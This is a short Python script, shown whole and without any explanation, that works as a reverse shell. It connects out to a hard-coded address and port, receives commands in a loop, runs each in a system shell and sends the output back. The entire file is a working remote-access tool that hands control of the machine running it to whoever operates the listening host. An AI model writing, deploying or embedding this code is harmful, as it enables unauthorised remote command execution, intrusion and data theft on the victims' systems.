import socket
import subprocess

server_ip = "192.168.1.100"
server_port = 7862

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((server_ip, server_port))

while True:
    command = client.recv(1024).decode()
    if command.lower() == "exit":
        break
    output = subprocess.run(command, shell=True, capture_output=True, text=True)
    client.send(output.stdout.encode() or b"Command executed")
    
client.close()
